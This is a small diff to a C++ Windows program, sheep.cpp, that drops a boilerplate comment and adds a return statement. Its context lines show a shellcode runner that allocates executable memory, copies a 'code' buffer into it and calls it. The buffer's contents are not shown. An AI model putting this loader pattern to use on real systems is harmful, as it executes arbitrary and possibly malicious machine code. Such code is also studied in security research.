@@ -1,6 +1,3 @@
-// sheep.cpp : Defines the entry point for the console application.
-//
-
 #include "stdafx.h"
 #include<Windows.h>
 #include<string.h>
@@ -46,6 +43,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	void* p=VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
 	RtlMoveMemory(p,code,sizeof(code));
 	((void(*)())p)();
+    return 0;
 }
 
 
